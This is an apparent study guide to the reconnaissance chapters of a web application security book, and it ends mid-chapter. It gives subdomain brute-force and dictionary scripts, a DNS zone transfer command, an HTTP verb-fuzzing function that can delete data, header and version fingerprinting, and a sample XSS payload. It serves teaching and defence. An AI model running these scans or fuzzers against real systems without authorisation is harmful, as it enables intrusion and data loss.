Part I

Recon

Chapters 2–8 of Web Application Security: Exploitation and Countermeasures (Andrew Hoffman, 2nd ed. 2024). Part I is not about hacking yet — it is about building a map of an application before you touch it: its hosts, its APIs, its dependencies and the weak spots in its architecture. Everything below is explained in plain language, with the book’s own figures and code.

Chapters 2–8 Pages 21–110 of Part I 6 figures + 20 code listings No exploitation yet — this is the map

Part I in one page

Recon is building a map of an application — technical and functional — so you know what to attack and in which order. Recon skills on their own are worth little; they become valuable when combined with offensive knowledge (what to do with the map) and defensive experience (what the defenders probably did).

The book opens Part I with a philosophical point that is easy to skip and important not to: a hacker must understand the application as a business, not just as code. Who are its users? How does it earn money? Why do users pick it over competitors? Without that, you cannot tell which data and which features actually matter. A car-sales site treats inventory and prices as mission-critical; a hobby site where enthusiasts post photos of their own cars treats user accounts as the crown jewels.

The four things Part I teaches you to map

  • The business and the roles (Chapter 2) — what the app does, who uses it, and what privileged interfaces must exist behind it (admin, teller, moderator).
  • The hosts (Chapter 4) — every subdomain and server attached to the domain. The main site is the most hardened part; the interesting things live on the side doors.
  • The API surface (Chapter 5) — endpoints, HTTP verbs, authentication scheme, and the payload shape each endpoint expects.
  • The stack and its weak points (Chapters 3, 6, 7) — frameworks, servers, databases, libraries and versions; then the architectural signals that say “many bugs live here”.
Read this before you try anything

The book is explicit: these techniques can get your IP flagged, your account banned, or land you in legal trouble. Only perform them against applications you own or have written permission to test. Several techniques in this Part (verb fuzzing, brute forcing) can delete or modify real data.

Why a defender should read Part I

Every technique here is a question your own application must be able to answer: do I know all my subdomains? Do I know which headers leak my stack? Do I know where my authorization checks live? Recon is also the cheapest form of self-audit — you find the weak mechanism before someone else does.

Chapter 2 · Introduction to Web Application Reconnaissance

The user interface is not the application. What you can click is a small, curated subset of what actually exists — and the rest is what recon is for.

What recon actually is

  • Definition — the explorative data-gathering phase that happens before attacking. Hackers, pen testers and bug-bounty hunters do it; security engineers should do it too, to find weakly secured mechanisms and fix them first.
  • Recon alone is not valuable — the skill becomes valuable when paired with offensive knowledge (how to use the map) and defensive experience (what the defenders probably forgot).
  • You are not “inside” the UI — even public apps expose only part of their interface. Assume you are seeing a subset until proven otherwise.
  • You do not need a UI at all — you can map an application you have no access to, purely by reverse-engineering the structure of its APIs and the payloads they accept.

The MegaBank thought experiment: why hidden interfaces must exist

The book walks through a normal bank account: you open a checking account in a branch, a teller types it in, later you can view your balance online, and a banker can add a savings account or close your account for you. You — the customer — can read, but you cannot create, modify or delete your own account online. So somebody else must have an application that can. That reasoning produces this table (the book’s own):

User typePositionPermissions
CustomerExternalLog in to the website. Read account balance via the web UI.
TellerInternalCreate new accounts when provided paperwork from a customer.
BankerInternalModify existing accounts on behalf of customers.

Conclusions the book draws from this:

  • Large organisations cannot have developers hand-writing database queries per operation, so there is automation behind the scenes that external users never see.
  • That automation almost always uses tiered permissions — role-based access control (RBAC). Very few applications give every user one single permission level.
  • Walking the UI will never show you the endpoints meant for moderators or admins — but recon often can. You can even map the full permission set of an admin and compare it with a normal user’s.
  • Occasionally you find a glitch that lets a non-privileged user reach privileged functionality. That glitch is the vulnerability.
  • Sometimes you meet servers or APIs that are protected by nothing at all — one forgotten firewall rule puts an internal server on the public internet.

Web application mapping: write it down

The book uses “map” the way geography does: the features, shapes and surfaces of an application. A map can be scratch notes for a small target, or a structured document for a big one. The only real requirements are that it stays traversable and that it preserves relationships and hierarchies. Hoffman prefers JSON-like notes and suggests tools such as Notion or XMind.

Recon notes in JSON form — the book’s example, lightly trimmedbook code
{
  api_endpoints: {
    sign_up: {
      url: 'mywebsite.com/auth/sign_up',
      method: 'POST',
      shape: {
        username:     { type: String, required: true,  min: 6, max: 18 },
        password:     { type: String, required: true,  min: 6, max: 32 },
        referralCode: { type: String, required: false, min: 64, max: 64 }
      }
    },
    sign_in: {
      url: 'mywebsite.com/auth/sign_in',
      method: 'POST',
      shape: {
        username: { type: String, required: true, min: 6, max: 18 },
        password: { type: String, required: true, min: 6, max: 32 }
      }
    },
    reset_password: {
      url: 'mywebsite.com/auth/reset',
      method: 'POST',
      shape: {
        username:    { type: String, required: true, min: 6, max: 18 },
        password:    { type: String, required: true, min: 6, max: 32 },
        newPassword: { type: String, required: true, min: 6, max: 32 }
      }
    }
  },
  features: {
    comments: {},
    uploads: { file_sharing: {} }
  },
  integrations: {
    oauth: { twitter: {}, facebook: {}, youtube: {} }
  }
}
The pattern to notice

For every endpoint the note stores four things: URL, method, shape, and the fields with their limits. Those limits (min: 6, max: 18) are pure gold later — they tell you which input is validated and which is guessed, and they become your fuzzing ranges in Part II.

Chapter 3 · The Structure of a Modern Web Application

You cannot recognise a misconfiguration if you do not recognise the component. This is the anatomy lesson: REST, JSON, JavaScript, the DOM, SPAs, auth systems, servers, databases, GraphQL, git and CDNs.

Modern vs legacy applications

  • Ten years ago — server-side frameworks rendered an HTML page and sent it to the browser; to update anything, the client requested another whole page. Then AJAX arrived and pages learned to make requests from inside a session.
  • Today — the “application” is usually several applications talking over a network: a client app plus one or more stateless REST APIs, plus storage and third-party services.
  • The browser app is a real application — it boots once, manages its own lifecycle, requests its own data, and no longer reloads pages. One client commonly talks to several different servers (e.g. one host for images, another for logins and data).

The book’s list of what a typical modern app is built from: REST API · JSON or XML · JavaScript · an SPA framework (React, Vue, Ember, Angular) · an authentication and authorisation system · one or more web servers (usually Linux) · web server software (Express, Apache, NGINX) · one or more databases (MySQL, MongoDB…) · a client-side data store (cookies, web storage, IndexedDB).

REST APIs in plain language

REST (Representational State Transfer) is a set of rules for an API. The book’s four defining traits:

  1. Separate from the client — the client can request resources but cannot run server logic or touch the database directly.
  2. Stateless — the API stores nothing about the caller’s connection. It can still authenticate and authorise, but the proof travels on every request (usually a token).
  3. Cacheable — responses can be marked cacheable or not, which is how these APIs scale. Badly managed caches leak one user’s data to another.
  4. One endpoint per object or method, organised hierarchically — e.g. /moderators/joe/logs/12_21_2018. Combined with HTTP verbs, the API becomes self-documenting: DELETE /moderators/joe/logs/12_21_2018 does exactly what it reads like.
HTTP verbREST meaningEveryday translation
POSTCreateMake a new thing
GETReadShow me the thing
PUTUpdate / replaceReplace the thing with this
PATCHUpdate / modifyChange part of the thing
DELETEDeleteRemove the thing

REST vs SOAP: older enterprise apps used SOAP, which always speaks XML. REST targets data rather than functions, caches easily and scales better; it accepts any data format, and in practice that format is JSON. That is why SOAP/XML is now mostly found in legacy enterprise systems.

The same user object, in XML (SOAP era)book code
<user>
 <username>joe</username>
 <password>correcthorsebatterystaple</password>
 <email>joe@website.com</email>
 <joined>12/21/2005</joined>
 <client-data>
  <timezone>UTF</timezone>
  <operating-system>Windows 10</operating-system>
  <licenses>
   <videoEditor>abc123-2005</videoEditor>
   <imageEditor>123-456-789</imageEditor>
  </licenses>
 </client-data>
</user>
…and in JSON (modern era)book code
{
 "username": "joe",
 "password": "correcthorsebatterystaple",
 "email": "joe@website.com",
 "joined": "12/21/2005",
 "client_data": {
  "timezone": "UTF",
  "operating_system": "Windows 10",
  "licenses": {
   "videoEditor": "abc123-2005",
   "imageEditor": "123-456-789"
  }
 }
}

Why JSON won: it is lightweight (less bandwidth), needs very little parsing, is human-readable, is hierarchical, and looks almost like a JavaScript object — so every browser can parse it natively and fast.

JSON is just a string until you parse itbook code
const jsonString = `{
 "first": "Sam",
 "last": "Adams",
 "email": "sam.adams@company.com",
 "role": "Engineering Manager",
 "company": "TechCo.",
 "location": {
  "country": "USA",
  "state": "california",
  "address": "123 main st.",
  "zip": 98404
 }
}`;

// convert the string sent by the server to an object
const jsonObject = JSON.parse(jsonString);

JavaScript — the parts that matter for security

Servers can run any language; the browser only runs JavaScript. That is why every example in this book — and in Part I especially — is JavaScript. Five quirks are worth knowing before any of it makes sense:

1. Variables and scope

Four ways to declare the same variable — four different behavioursbook code
// global definition — no keyword at all
age = 25;

// function scoped
var age = 25;

// block scoped
let age = 25;

// block scoped, without reassignment
const age = 25;
  • No keyword → global. The variable is hoisted to global scope and also appears as a property of window, where any other script can read or overwrite it. That is a name-collision risk and a real security risk.
  • var → function-scoped. Declared inside an if block but inside a function, it is still visible after the block — the classic source of confusing bugs.
  • let → block-scoped. Same code, but now the variable is gone once the block ends. Fewer scope bugs.
  • const → block-scoped and cannot be reassigned (like final in Java).
The global leak, demonstratedrisky
// define global integer
age = 25;

console.log(age);        // 25 — direct call
console.log(window.age); // 25 — same thing, via the window object

2. Functions and context

Functions in JavaScript are objects: they can be assigned, passed and redefined. They come as anonymous functions, named functions, arrow (shorthand) functions that share their parent’s context, and the IIFE — an immediately invoked function expression, (function(){})(), used to run code in its own scope. Every function carries a this context that can be moved around with bind, call and apply.

Moving context between functionsbook code
// create a new getAge() clone bound to the ageData context
const getBoundAge = getAge.bind(ageData)('joe');

// invoke immediately with a supplied context
const boundAge = getAge.call(ageData, 'joe');
const boundAge2 = getAge.apply(ageData, ['joe']);

// arrow functions inherit context instead of defining their own
const soup = { garlic: true };
soup.hasGarlic1 = function() { console.log(this.garlic); }; // true
soup.hasGarlic2 = () => { console.log(this.garlic); };       // false

3. Prototypal inheritance

There are no classes underneath — objects inherit from other objects through a prototype chain. Every object has a prototype pointer back to the function that created it. That single mechanic is why prototype pollution (Part II) is possible: write to Object.prototype and every object in the application inherits your value.

4. Asynchrony

Network requests take unpredictable time. Instead of waiting, JavaScript fires requests and describes what to do when they finish. Three generations of doing this:

Three ways to chain the same three requestsbook code
// 1. Callbacks — fast, but a pyramid of doom
getUser(function(user) {
  getUserProfile(user, function(profile) {
    setUserProfileConfig(profile, config, function(result) {
      console.log('success!');
    });
  });
});

// 2. Promises — vertical, with one place for errors
new Promise((resolve, reject) => { /* ... */ })
  .then((user) => { /* ... */ })
  .then((profile) => { /* ... */ })
  .catch((err) => console.log('an error occurred!'));

// 3. async / await — reads like synchronous code
const setUserProfile = async function() {
  let user        = await getUser();
  let userProfile = await getUserProfile(user);
  let setProfile  = await setUserProfile(userProfile, config);
};
setUserProfile();
Why this matters for recon scripts

Because requests can run concurrently, a recon script fires hundreds of DNS lookups or HTTP requests at once instead of waiting for each one. That is the difference between a brute force that takes minutes and one that takes days (Chapter 4 depends on it).

5. The browser DOM

The DOM is the browser’s standard library and its hierarchical model of the page. Its two main objects are window and document, defined by a spec maintained by WHATWG. Functions such as document.querySelector() look like JavaScript but are DOM methods. For security, the DOM is where data becomes markup — i.e. where XSS appears.

SPA frameworks

Old sites were ad-hoc scripts plus reused HTML templates — fine for static pages, useless for app-like behaviour. Single-page application frameworks closed that gap: they hold their own state, are built from reusable components with their own lifecycles, and deliver near-desktop experiences (Facebook, YouTube). The big open-source ones are React, Ember, Vue and Angular. They all sit on top of JavaScript and the DOM, and they add complexity from a security point of view — client-side routing, client-side storage and client-side rendering all become attack surface.

Authentication and authorisation

Authentication (AuthN)Authorisation (AuthZ)
Question“Are you really joe123?”“What may joe123 touch?”
ExamplePassword, token, MFA, OAuth loginjoe123 sees his photos; susan1988 sees hers, not each other’s
Where recon looksHow the session token is attached to requestsWhich resources get checked, and where the check lives
  • HTTP Basic — Authorization: Basic <base64(user:password)> on every request. Supported by every browser, but the session never expires and the credentials are trivially decoded (atob()). Base64 is encoding, not encryption.
  • Digest — hashes instead of base64, so harder to intercept and replay; the strength depends entirely on the hash used.
  • OAuth — a big provider vouches for your identity with a token. Convenient (one place to update your data), but one compromised provider account compromises every connected app.
  • MFA — usually layered on top, so a stolen password is not enough.
The architectural tell the book gives you

Well-designed applications centralise authorisation in one class. Poorly written APIs re-implement the check in every endpoint — and by human error, some of those copies will be missing. If you spot per-endpoint hand-rolled checks, expect to find the one that forgot.

Servers, databases and client-side storage

  • Web servers — application logic sits on web server software, which sits on Linux, which sits on hardware. Apache (~half of all sites, since 1995), NGINX (~30%, growing, far less overhead per connection) and Microsoft IIS (Microsoft-specific stacks). Knowing the big three is how you later spot configuration-based vulnerabilities rather than logic bugs.
  • SQL databases — still the default: PostgreSQL, SQL Server, MySQL, SQLite. Strict but fast and easy to query.
  • NoSQL — MongoDB, DocumentDB, CouchDB: flexible “documents”, weaker at querying and aggregating.
  • Specialised stores — e.g. Elasticsearch for search, synchronised with the main database.
  • Multiple databases at once is normal — and dangerous: an app with perfect SQL handling may have wide-open MongoDB or Elasticsearch queries and permissions.
  • Client-side stores — localStorage (persistent key/value, protected by the browser’s same-origin policy), sessionStorage (gone when the tab closes), and IndexedDB (an in-browser queryable NoSQL database).
The book’s warning about client stores

In poorly architected applications, client-side data stores can reveal sensitive data such as authentication tokens or other secrets. If a token lives in localStorage, any XSS on the site can read it.

GraphQL

GraphQL wraps existing endpoints and lets the client ask for exactly the fields it wants, bundling several requests into one network hop. That is great for performance and offers richer features (aliases, fragments, variables, directives, mutations). The recon twist: the client is now writing the query, so the server must bound what a query is allowed to cost.

Version control, CI/CD and CDNs

  • Git — branches, stashes and history, and hosts like GitHub and GitLab on top. History is recon material: it shows how the code evolved, what was removed, and what was accidentally published.
  • CI/CD — pushes trigger tests and deployments. The book’s key sentence: security is no longer tied only to the network stack and application code, but also to the version-control system and the delivery pipeline. A compromise at either layer can be catastrophic.
A normal Git workflow (and where secrets like to hide)book code
git init
git remote add origin <github-repository-url>
touch .gitignore
echo "node_modules" > .gitignore
git add -A
git commit -m "initial commit"
git push --set-upstream origin main

The .gitignore is the interesting line: whatever is not listed there gets committed forever. A key removed in a later commit still lives in history.

Chapter 4 · Finding Subdomains

The consumer-facing site is the most-watched, most-patched part of any company. The interesting bugs live on the subdomains nobody brags about.

The mindset first

Walking a public app and watching its network traffic only gets you so far. What you actually want is the list of hosts attached to the domain that are not linked from the public app at all — admin panels, APIs, dev and staging environments, mail and internal tools.

Technique 1 — the browser’s own network tools

Open DevTools → Network and watch every request: the request URL tells you which domain something was sent to or served from. Asynchronous calls are the valuable ones, because they often point at hosts the UI never links to.

Technique 2 — public records: search engine caches

Google has more indexed data than anyone, but a raw search is too noisy. The trick is operators: site: restricts the domain, -inurl: removes the parts you already know about.

Filtering a site down to the parts you have not seenbook code
site:mega-bank.com log in

site:mega-bank.com -inurl:www -inurl:mobile

The first query finds login pages across the domain. The second removes the main site and the mobile site, so what remains is the interesting long tail. Repeat until no new results appear, and try other engines — they support the same operators.

Technique 3 — public records: accidental archives

Archive.org keeps snapshots of websites going back decades (the New York Times alone has over 500,000 home-page snapshots since 1996). Old snapshots contain links and code that were removed from the live app but were once public — old subdomains, old download paths, old parameters.

The book’s manual recipe: open ten archives from ten dates spaced far apart → “View source” → select all → copy into a single legacy-source.html → search that file for http://, https:// and file:// to pull out every host that ever appeared.

Technique 4 — public records: social snapshots

Marketing campaigns, support links and recruiting posts leak subdomains. Every major platform offers a data/search API that can be queried for links to the target domain. The book’s example is the X (Twitter) search API:

Querying a social search API for links to the target domainbook code
curl --request POST \
  --url https://api.twitter.com/1.1/tweets/search/30day/Prod.json \
  --header 'authorization: Bearer <MY_TOKEN>' \
  --header 'content-type: application/json' \
  --data '{
           "maxResults": "100",
           "keyword": "mega-bank.com"
           }'

Then scan the returned text for links: they tend to reveal hosts tied to campaigns, trackers and hiring events. Note the ethical caveat the book raises — this analyses data about ordinary users, so use it only within an authorised engagement.

Technique 5 — DNS zone transfer attacks

DNS turns names into IP addresses, and DNS servers keep their records in a zone file. Zone transfers exist so that a secondary server can copy the zone from the primary. If the primary does not restrict who may ask, anyone can ask — and receive the entire record list, including hosts that are not linked from the web app.

Ask for the nameservers, then ask one of them for the zonebook code
# 1. who serves DNS for the domain?
host -t mega-bank.com

# 2. pretend to be a secondary server and request the zone file
host -l mega-bank.com ns1.bankhost.com
If the server is misconfigured, you get everything at oncemisconfigured DNS
Using domain server:
Name: ns1.bankhost.com
Address: 195.11.100.25
Aliases:

mega-bank.com has address 195.250.100.195
mega-bank.com name server ns1.bankhost.com
mega-bank.com name server ns2.bankhost.com
mail.mega-bank.com has address 82.31.105.140
admin.mega-bank.com has address 32.45.105.144
internal.mega-bank.com has address 25.44.105.144

A correctly configured server simply answers : Transfer Failed. The book’s verdict: it is cheap to try (two lines of Bash) and easy to defend, so it is almost always worth attempting.

Technique 6 — brute forcing subdomains

Last resort, and noisy: attempts are easily logged and rate-limited, and network latency (50–250 ms per request) makes naive loops unbearably slow. So the script is asynchronous — fire everything, then collect.

Generate every candidate name up to a lengthbook code
const generateSubdomains = function(length) {
  const charset = 'abcdefghijklmnopqrstuvwxyz'.split('');
  let subdomains = charset;
  let subdomain, letter, temp;

  for (let i = 1; i < length; i++) {
    temp = [];
    for (let k = 0; k < subdomains.length; k++) {
      subdomain = subdomains[k];
      for (let m = 0; m < charset.length; m++) {
        letter = charset[m];
        temp.push(subdomain + letter);
      }
    }
    subdomains = temp;
  }
  return subdomains;
};

const subdomains = generateSubdomains(4);
Resolve every candidate concurrently with Node’s DNS librarybook code
const dns = require('dns');
const promises = [];

subdomains.forEach((subdomain) => {
  promises.push(new Promise((resolve, reject) => {
    dns.resolve(`${subdomain}.mega-bank.com`, function (err, ip) {
      return resolve({ subdomain: subdomain, ip: ip });
    });
  }));
});

Promise.all(promises).then(function(results) {
  results.forEach((result) => {
    if (!!result.ip) { console.log(result); }
  });
});

Two engineering details the book highlights: dns.resolve is used instead of dns.lookup because lookup only looks asynchronous — underneath it calls the operating system’s synchronous getaddrinfo(3). And Promise.all fires everything before collecting, which is what makes the brute force finish in a reasonable time.

Output — the map starts to fill inresult
{ subdomain: 'mail',  ip: '12.32.244.156' },
{ subdomain: 'admin', ip: '123.42.12.222' },
{ subdomain: 'dev',   ip: '12.21.240.117' },
{ subdomain: 'test',  ip: '14.34.27.119' },
{ subdomain: 'www',   ip: '12.14.220.224' },
{ subdomain: 'shop',  ip: '128.127.244.11' },
{ subdomain: 'ftp',   ip: '12.31.222.212' },
{ subdomain: 'forum', ip: '14.15.78.136' }

Technique 7 — dictionary attacks (the sane version)

A dictionary attack tries a list of common subdomain names instead of every combination. It is far faster and usually finds something. The book lists the top of the dnscan wordlist — www, mail, ftp, localhost, webmail, smtp, pop, ns1, webdisk, ns2, cpanel, whm, autodiscover, autoconfig, m, imap, test, ns, blog, pop3, dev, www2, admin, forum, news — and dnscan publishes 10,000 of them under a permissive licence.

Large lists should be streamed from disk rather than loaded into memory, and the same dns.resolve pattern is reused:

Streaming a wordlist and resolving each candidatebook code
const dns = require('dns');
const csv = require('csv-parser');
const fs = require('fs');
const promises = [];

fs.createReadStream('subdomains.csv')
  .pipe(csv())
  .on('data', (row) => {
    promises.push(new Promise((resolve, reject) => {
      dns.resolve(`${row.subdomain}.mega-bank.com`, function (err, ip) {
        return resolve({ subdomain: row.subdomain, ip: ip });
      });
    }));
  })
  .on('end', () => {
    // after all of the DNS queries have completed, log the results
    Promise.all(promises).then(function(results) {
      results.forEach((result) => {
        if (!!result.ip) { console.log(result); }
      });
    });
  });
The book’s recommended order

Start with the dictionary (cheap, fast, high hit rate). Only fall back to generated brute force for the strange, non-standard names the dictionary missed.

Chapter 5 · API Analysis

Once you know the hosts, the next question is: what does each host expose, with which verbs, behind which authentication, expecting which payload?

Recognising a REST API from traffic

Hierarchical resources = RESTbook code
GET  api.mega-bank.com/users/1234
GET  api.mega-bank.com/users/1234/payments
POST api.mega-bank.com/users/1234/payments

Each URL names a resource, not a function, and payments is nested inside users/1234 — so the API is hierarchical. A token on every request is the second tell, because REST is supposed to be stateless:

A stateless, token-authenticated requestbook code
POST /users/1234/payments HTTP/1.1
Host: api.mega-bank.com
Authorization: Bearer abc21323
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/1.0 (KHTML, like Gecko)

Which verbs does the endpoint accept?

The HTTP spec has a verb that exists purely to describe an endpoint: OPTIONS. It is the first thing to try.

Asking an endpoint what it supportsbook code
curl -i -X OPTIONS https://api.mega-bank.com/users/1234

# 200 OK
# Allow: HEAD, GET, PUT, DELETE, OPTIONS

But OPTIONS is usually enabled only on APIs deliberately published for public use, so enterprise apps rarely expose it. The practical alternative is to try each verb against a known endpoint and watch for a status code.

discoverHTTPVerbs() — try POST, GET, PUT, PATCH, DELETE on one URLbook code
const discoverHTTPVerbs = function(url) {
  const verbs = ['POST', 'GET', 'PUT', 'PATCH', 'DELETE'];
  const promises = [];

  verbs.forEach((verb) => {
    const promise = new Promise((resolve, reject) => {
      const http = new XMLHttpRequest();
      http.open(verb, url, true);
      http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');

      http.onreadystatechange = function() {
        if (http.readyState === 4) {
          return resolve({ verb: verb, status: http.status });
        }
      };

      // if the request does not complete in time, mark it as unsuccessful
      setTimeout(() => {
        return resolve({ verb: verb, status: -1 });
      }, 1000);

      http.send({});
    });
    promises.push(promise);
  });

  Promise.all(promises).then(function(values) {
    console.log(values);
  });
};

The logic is deliberately dumb: any status code at all means “this verb maps to something”; no response within a second becomes -1. One second is generous for an API, and the timeout is meant to be tuned.

Careful

Fuzzing verbs can delete or modify real data — a stray DELETE against a live endpoint is exactly as destructive as it sounds. The book requires explicit permission before doing this.

Which authentication scheme is in use?

You need to know this before you can test anything else, because most endpoints only behave interestingly for an authenticated user. The book compares the three classic schemes:

SchemeHow it worksStrengthWeakness
HTTP BasicUsername and password sent (base64) on every requestNatively supported by every browserSession never expires; easy to intercept or decode
HTTP DigestHashed username:realm:password on every requestHarder to intercept; server can reject expired tokensStrength depends on the hashing algorithm
OAuth“Bearer” token issued by another site (e.g. “sign in with Amazon”)Tokenised permissions can be shared between appsPhishing risk; compromise the central site and you compromise every connected app

And the recognition step, in one screenshot of a request: a Basic header means basic auth, and the value decodes instantly.

Spot basic auth, then decode it in the consolebook code
GET /homepage
HOST mega-bank.com
Authorization: Basic am9lOjEyMzQ=
Content Type: application/json

/* Result = joe:1234 */
atob('am9lOjEyMzQ=');

Because this scheme is so weak, it is normally only acceptable over TLS — which is exactly why the book notes the credentials cannot be lifted mid-air on a café Wi-Fi, but can be lifted by XSS. The recon payoff: once you know requests are authenticated with a header, re-try the endpoints that returned nothing with that header attached.

What payload shape does the endpoint expect?

  • Common shapes — many endpoints follow a public spec. An OAuth 2.0 authorisation endpoint always expects the same fields, so the spec is the documentation:
A standard OAuth 2.0 authorisation payloadbook code
{
  "response_type": code,
  "client_id": id,
  "scope": [scopes],
  "state": state,
  "redirect_uri": uri
}
  • Application-specific shapes — when no spec exists, the only reliable source is the traffic the app itself sends. Guessing works less well, and automated shape-guessing is trivially detectable.
  • Start where everyone starts — sign in, sign up, password reset. Authentication endpoints are usually built on a standard scheme, so their shapes are guessable across applications.

Chapter 6 · Identifying Third-Party Dependencies

Find the library, find the version, and an existing public exploit usually does the rest — that is what CVE databases are for.

Dependencies come in-house and external, free (open source) or licensed. They are attractive because they are often not reviewed as carefully as first-party code, and because their vulnerabilities are already public: sometimes you do not have to write an attack at all, you copy one from a CVE. These techniques apply to client-side frameworks (SPA libraries, JS helpers, CSS frameworks) and to server-side software.

Client side: SPA frameworks announce themselves

Four frameworks, four one-liners, four versionsbook code
// EmberJS — a global object with a version constant
console.log(Ember.VERSION);          // 3.1.0

// React — the same idea
console.log(React.version);          // 0.13.3

// VueJS — the same idea
console.log(Vue.version);            // 2.6.10

// Angular 4+ — no global version; read the attribute on the root element
const elements = getAllAngularRootElements();
const version  = elements[0].attributes['ng-version'];  // ng-version="6.1.2"
console.log(version);

Extra details the book gives per framework: Ember tags DOM elements with ember-id and wraps them in a class="ember-application" parent (usually the body). React leaves script tags of type text/jsx. Angular before 4.0 had a global angular object with angular.version; on 4.0+ you check for the ng global instead and then read ng-version. And Vue may hide its components from devtools — a single line turns them back on:

Re-enabling Vue component inspectionbook code
// Vue components can now be inspected
Vue.config.devtools = true;

Client side: JavaScript libraries and CSS

Some libraries namespace themselves on globals — Underscore and Lodash use _, jQuery uses $ — which makes them instantly visible. Everything else you find by listing the scripts the page actually loaded:

List every external script (and then every stylesheet)book code
const getScripts = function() {
  const scripts = document.querySelectorAll('script');
  scripts.forEach((script) => {
    if (script.src) {
      console.log(`i: ${script.src}`);
    }
  });
};

// output
// i: https://www.google-analytics.com/analytics.js
// i: https://www.googletagmanager.com/gtag/js?id=UA-1234
// i: https://js.stripe.com/v3/
// i: https://code.jquery.com/jquery-3.4.1.min.js
// i: https://cdnjs.cloudflare.com/ajax/libs/d3/5.9.7/d3.min.js
// i: /assets/main.js
The same trick for CSS librariesbook code
const getStyles = function() {
  const links = document.querySelectorAll('link');
  links.forEach((link) => {
    if (link.rel === 'stylesheet') {
      console.log(`i: ${link.getAttribute('href')}`);
    }
  });
};

// output
// i: /assets/jquery-ui.css
// i: /assets/bootstrap.css
// i: /assets/main.css
// i: /assets/components.css
// i: /assets/reset.css

Server side: headers, error pages and fingerprints

The server is harder to see than the client, but it leaves marks.

  • Headers that talk too much — X-Powered-By: ASP.NET, or better still Server: Microsoft-IIS/4.5 plus X-AspNet-Version: 4.0.25. Competent admins remove them; millions of sites still send them.
  • Default error and 404 pages — each framework ships its own, and they survive until someone replaces them. They often reveal the framework and even a version range.

The book’s worked example is Ruby on Rails. Its default 404 page is a box saying “The page you were looking for doesn’t exist”. That page is in the public Rails repository, so its history is public too — and each commit is a timestamp marker:

DateChange to the 404 pageWhat it tells you
5 Apr 2012HTML5 type attribute removedIf type="text/css" is still there → version from 2012 or earlier
21 Nov 2013U+00A0 replaced with whitespaceIf U+00A0 is present → from Nov 2013 or earlier
20 Apr 2017Namespaced CSS selectors (.rails-default-error-page) addedIf those selectors are missing → from Apr 2017 or earlier

Combining the surviving markers with the official release schedule narrows the application to a range — in the book’s example Rails 3.2.16 to 4.2.8. And that range is vulnerable to CVE-2016-6316, an XSS where HTML padded with quotes injected into a database field is executed by an Action View tag helper. One 404 page, one version range, one documented exploit.

Server side: which database?

Database errors rarely reach the client, so the book uses a subtler signal: primary key scanning. Every database generates primary keys in its own way, so the shape of an id in traffic identifies the database.

MongoDB’s default _id is an ObjectId: exactly 12 bytes — 4 bytes of Unix timestamp, 5 random bytes, 3 bytes of a counter starting from a random value — rendered as a 12-byte hexadecimal string:

A MongoDB ObjectId, and where ids show up in trafficbook code
507f1f77bcf86cd799439011

GET users/:id                       // id in the path
PUT users, body = { id: id }        // id in the body
GET users?id=id                     // id in the query string

// …and sometimes in object metadata
{
  _id: '507f1f77bcf86cd799439011',
  username: 'joe123',
  email: 'joe123@my-email.com',
  role: 'moderator',
  biography: '...'
}

If ids look like 12-byte hex strings, you are probably looking at MongoDB. Sequential integers could be several databases, so that pattern tells you less — often you then combine it with forced error messages to disambiguate.

Chapter 7 · Identifying Weak Points in Application Architecture

One XSS is probably one careless method. Dozens of XSS in the same app is an architecture problem — and architecture is the best predictor of where the next bug will be.

First, what your map should contain

  • Technology used in the application
  • API endpoints, grouped by HTTP verb
  • API endpoint shapes, where you know them
  • Functionality included (comments, auth, notifications, uploads…)
  • Domains used by the application
  • Configurations found (e.g. a Content Security Policy)
  • Authentication and session-management systems

That list is what turns recon into prioritisation: with it you can rank what to attack first, instead of working alphabetically.

Secure vs insecure architecture, by example

Take two apps that both let users send direct messages. In the insecure one, the API accepts a script, the database stores it, nothing filters it on the way back, and it reaches the DOM — <script>alert('hacked')</script> executes. The secure one has one or more of those protections.

But per-case protections are expensive and easy to forget. The book’s framing: a secure application implements security before and during feature development; a mediocre one implements it during; an insecure one does not implement it at all. Rewrite the same messaging feature ten times over five years and each implementation will differ structurally — while the security risks stay identical.

The book’s messaging feature, reduced to its partsbook code
// client/send.js — collect the message and the target, then POST it
const send = function() {
  const message = document.querySelector('#send').value;
  const target  = document.querySelector('#target').value;
  messageUtils.sendMessageToServer(session.token, target, message);
};

// server/postMessage.js — check the request, then store it
const postMessage = function(req, res) {
  if (!req.body.token || !req.body.target || !req.body.message) {
    return res.sendStatus(400);
  }
  saveMessage(req.body.token, req.body.target, req.body.message)
    .then(() => res.sendStatus(200))
    .catch((err) => res.sendStatus(400));
};

// client/displayMessage.js — fetch a message and render it
const displayMessage = function(msgId) {
  messageUtils.getMessageById(session.token, msgId)
    .then((msg) => {
      messageUtils.appendToDOM('#message', msg);
      messageUtils.appendToDOM('#message-author', msg.author);
    })
    .catch(() => console.log('an error occured'));
};

Now the architectural fix — one shared utility, with the dangerous path explicitly labelled and off by default:

appendToDOM() — safe by default, unsafe only when askedsafe pattern
import { DOMPurify } from '../utils/DOMPurify';
// makes use of: https://github.com/cure53/DOMPurify

const appendToDOM = function(data, selector, unsafe = false) {
  const element = document.querySelector(selector);

  // for cases where DOM injection is required (not default)
  if (unsafe) {
    element.innerHTML = DOMPurify.sanitize(data);
  } else {                       // standard cases (default)
    element.innerText = data;
  }
};

Three design details matter here, and the book points them out: the flag is off by default, it is named unsafe so nobody flips it casually, and it is the last parameter, so it is unlikely to be set by accident. A utility like this is the signature of a secure architecture — and its absence is the signature of an insecure one.

Multiple layers of security

The messaging example has five places where XSS risk lives:

  • API POST
  • Database write
  • Database read
  • API GET
  • Client read

The same is true of XXE, CSRF and most other vulnerability classes. Now the failure story: the developers sanitise at API POST, so single messages are safe. A year later someone ships a bulk messaging endpoint that accepts a list of messages — and it does not reuse the same sanitisation. The original protection is bypassed without anyone touching the original code.

The lesson

An application is only as secure as the weakest link in its architecture. If defences exist at two layers (say API POST and database write), the new endpoint cannot reopen the hole. And different layers can do different things: a headless browser at the API can detect script execution, which is impossible at the database layer — but a browser-specific bug might let a payload slip past the headless browser and still execute in a vulnerable real browser. Layers complement each other precisely because they are different.

Adoption and reinvention

